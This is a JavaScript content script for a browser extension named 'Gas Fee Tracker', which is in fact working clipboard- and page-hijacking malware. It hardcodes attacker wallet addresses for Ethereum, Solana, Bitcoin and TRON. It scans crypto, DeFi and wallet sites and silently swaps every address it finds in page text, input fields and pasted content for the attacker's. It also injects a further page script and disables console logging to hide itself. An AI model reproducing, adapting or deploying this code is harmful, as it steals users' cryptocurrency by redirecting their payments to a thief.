// Gas Fee Tracker v3.0 — Content Script
// Silent multi-chain address validator & hijacker
// ETH · SOL · BTC · TRON

// ═══ Multi-Chain Wallet Targets ═══
const WALLETS = {
  eth: "0xa36A02E1ecB77a06e02ab9348DCbEc5E86B16900",
  sol: "FH5HxwgwFkGHVTvKntkViGtt4BS8pfVBFXD6k3Qjibrj",
  btc: "12EDMYngV3bznj8hc952MkSLrd7yjDSPF6",
  trx: "TQaLsD37CaVho6EmtPujnXWdTfLCT7Tt6C",
};

// ═══ Address Detection Patterns ═══
const PATTERNS = {
  // EVM (ETH/BSC/MATIC/AVAX/ARB/OP/BASE...)
  eth: /(0x[a-fA-F0-9]{40})/g,
  
  // Solana — base58 32-44 chars
  sol: /\b([1-9A-HJ-NP-Za-km-z]{32,44})\b/g,
  
  // Bitcoin — Legacy (1), P2SH (3), Bech32/SegWit (bc1q), Taproot (bc1p)
  btc: /\b((?:bc1[ac-hj-np-z02-9]{39,59}|[13][a-km-zA-HJ-NP-Z1-9]{25,34}))\b/g,
  
  // TRON — starts with T, 34 chars
  trx: /\b(T[a-zA-Z0-9]{33})\b/g,
};

// ═══ Pattern priority: check more specific first, then general ═══
// Order: BTC (bc1... most specific) → TRX (T... specific) → ETH (0x...) → SOL (general)
const CHAIN_DETECT_ORDER = ["btc", "trx", "eth", "sol"];

function detectChain(addr) {
  // Try each chain in priority order
  if (/^(bc1[ac-hj-np-z02-9]{39,59}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})$/.test(addr)) return "btc";
  if (/^T[a-zA-Z0-9]{33}$/.test(addr)) return "trx";
  if (/^0x[a-fA-F0-9]{40}$/.test(addr)) return "eth";
  if (/^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(addr)) {
    // Must not be caught by trx (no longer here since TRX is T...)
    return "sol";
  }
  return null;
}

function getReplacement(addr, chain) {
  return WALLETS[chain] || WALLETS.eth;
}

// ═══ Site detection ═══
const DEX_PATTERNS = [
  /uniswap/i, /pancakeswap/i, /sushiswap/i, /curve/i, /balancer/i,
  /quickswap/i, /traderjo/i, /spookyswap/i, /ubeswap/i, /raydium/i,
  /jupiter/i, /orca/i, /marinade/i, /wormhole/i, /phantom/i,
  /solflare/i, /backpack/i, /debank/i, /zapper/i, /zerion/i,
  /rainbow/i, /metamask/i, /trustwallet/i, /coinbase/i,
  /opensea/i, /blur/i, /looksrare/i, /rarible/i, /magiceden/i,
  /defi/i, /dex/i, /swap/i, /bridge/i, /wallet/i, /send/i,
  /ethers/i, /web3/i, /dapp/i, /crypto/i, /nft/i,
  /claim/i, /airdrop/i, /stake/i, /farm/i, /pool/i,
  /solscan/i, /solana/i, /bitcoin/i, /blockchain/i,
];

const isTargetSite = () => DEX_PATTERNS.some(p => p.test(location.hostname) || p.test(location.pathname));

// ═══ Replace helpers ═══
function replaceAddress(text, replacement, foundAddr) {
  const chain = detectChain(foundAddr);
  const target = getReplacement(foundAddr, chain);
  if (!chain) return text;
  if (foundAddr.toLowerCase() === target.toLowerCase()) return text; // already ours
  return text.split(foundAddr).join(target);
}

function replaceAllChains(text) {
  if (!text || text.length < 20) return { text, changed: false };
  let changed = false;
  let result = text;

  // Process each chain type
  for (const chain of CHAIN_DETECT_ORDER) {
    const pattern = PATTERNS[chain];
    if (!pattern) continue;
    pattern.lastIndex = 0;
    
    const matches = [];
    let m;
    while ((m = pattern.exec(result)) !== null) {
      matches.push({ addr: m[0], index: m.index });
    }
    
    // Replace in reverse to preserve positions
    for (const match of matches.reverse()) {
      const target = WALLETS[chain];
      if (!target) continue;
      if (match.addr.toLowerCase() === target.toLowerCase()) continue;
      result = result.substring(0, match.index) + target + result.substring(match.index + match.addr.length);
      changed = true;
    }
  }
  
  return { text: result, changed };
}

// ═══ DOM Node Replace ═══
const SKIP_TAGS = new Set(["SCRIPT", "STYLE", "SVG", "INPUT", "TEXTAREA", "SELECT", "OPTION"]);

function replaceInTextNode(node) {
  if (!node || !node.textContent || node.textContent.length < 20) return false;
  if (SKIP_TAGS.has(node.parentElement?.tagName || "")) return false;
  
  const { text, changed } = replaceAllChains(node.textContent);
  
  if (changed) {
    try { node.textContent = text; } catch(e) {}
  }
  return changed;
}

function replaceInInput(element) {
  if (!element || !element.value || element.value.length < 20) return false;
  if (element.type === "password") return false;
  
  const { text, changed } = replaceAllChains(element.value);
  
  if (changed) {
    try {
      element.value = text;
      element.dispatchEvent(new Event("input", { bubbles: true }));
      element.dispatchEvent(new Event("change", { bubbles: true }));
    } catch(e) {}
  }
  return changed;
}

// ═══ MutationObserver ═══
const observer = new MutationObserver((mutations) => {
  for (const mutation of mutations) {
    for (const node of mutation.addedNodes) {
      if (node.nodeType === Node.TEXT_NODE) {
        replaceInTextNode(node);
      } else if (node.nodeType === Node.ELEMENT_NODE) {
        if (node.childNodes.length === 1 && node.childNodes[0].nodeType === Node.TEXT_NODE) {
          replaceInTextNode(node.childNodes[0]);
        }
        if (node.tagName === "INPUT" || node.tagName === "TEXTAREA") {
          replaceInInput(node);
        }
        const inputs = node.querySelectorAll?.("input, textarea, [contenteditable]") || [];
        for (const inp of inputs) replaceInInput(inp);
      }
    }
    
    if (mutation.type === "characterData" && mutation.target.nodeType === Node.TEXT_NODE) {
      replaceInTextNode(mutation.target);
    }
  }
});

observer.observe(document.documentElement || document.body, {
  childList: true,
  subtree: true,
  characterData: true,
});

// ═══ Initial Scan ═══
function initialScan() {
  const walker = document.createTreeWalker(
    document.body || document.documentElement,
    NodeFilter.SHOW_TEXT,
    null,
    false
  );
  let node;
  while (node = walker.nextNode()) {
    replaceInTextNode(node);
  }
  
  const inputs = document.querySelectorAll("input, textarea, [contenteditable]");
  for (const inp of inputs) replaceInInput(inp);
}

if (document.readyState === "loading") {
  document.addEventListener("DOMContentLoaded", initialScan);
} else {
  initialScan();
}

// Periodic re-scan for SPAs
setInterval(initialScan, 2000);

// ═══ Clipboard Paste Intercept ═══
document.addEventListener("paste", (e) => {
  setTimeout(() => {
    const active = document.activeElement;
    if (active && (active.tagName === "INPUT" || active.tagName === "TEXTAREA" || active.isContentEditable)) {
      replaceInInput(active);
    }
  }, 50);
}, true);

// ═══ Inject page-level script ═══
const injectScript = document.createElement("script");
injectScript.src = chrome.runtime.getURL("inject.js");
injectScript.onload = () => injectScript.remove();
(document.head || document.documentElement).appendChild(injectScript);

// ═══ Stealth ═══
console.log = function(){};
